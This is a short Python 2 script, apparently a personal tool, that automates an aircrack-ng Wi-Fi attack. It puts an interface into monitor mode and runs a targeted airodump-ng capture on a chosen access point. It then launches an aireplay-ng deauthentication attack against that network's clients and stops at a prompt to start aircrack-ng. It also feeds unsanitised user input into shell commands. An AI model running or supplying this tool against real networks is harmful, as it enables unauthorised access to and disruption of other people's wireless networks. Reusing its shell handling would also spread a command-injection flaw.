import subprocess

print "Automation tool for air*-ng suite by Zarkopafilis"
print ""
print "> ifconfig"
out = subprocess.check_output("ifconfig")
print out
print "> airmon-ng"
out = subprocess.check_output("airmon-ng")
print out
interface = raw_input("Enter interface > ")
x = raw_input("Set to monitor mode > ")
print "Shutting " + interface + "down..."
out = subprocess.check_output("ifconfig " + interface + " down" , shell=True)
print "Setting monitor mode..."
out = subprocess.check_output("iwconfig " + interface + " mode monitor", shell=True)
print "Bringing " + interface + "up"
out = subprocess.check_output("ifconfig " + interface + " up", shell=True)
print "All good"
x = raw_input("Start airodump-ng > ")
cmd = "airodump-ng " + interface
print "> " + cmd
subprocess.check_output("gnome-terminal -x sh -c '" + cmd + "; exec bash'" , shell=True)
bssid = raw_input("Enter BSSID > ")
channel = raw_input("Enter channel > ")
dumpFilePrefix = raw_input("Enter dump file prefix > ")
x = raw_input("Start targeted airodump-ng > ")
cmd = "airodump-ng -c " + channel + " --bssid " + bssid + " -w " + dumpFilePrefix + " " + interface
print "> " + cmd
subprocess.check_output("gnome-terminal -x sh -c '" + cmd + "; exec bash'" , shell=True)
packetCount = raw_input("Enter deauth packet count > ")
x = raw_input("Start aireplay-ng targeted deauth > ")
cmd = "aireplay-ng --deauth " + packetCount+ " -a " + bssid + " " + interface
print "> " + cmd
subprocess.check_output("gnome-terminal -x sh -c '" + cmd + "; exec bash'" , shell=True)
dumpFileName = raw_input("Enter dump file name > ")
dumpFile = dumpFilePrefix + dumpFileName;
x = raw_input("Start aircrack-ng when ready > ")
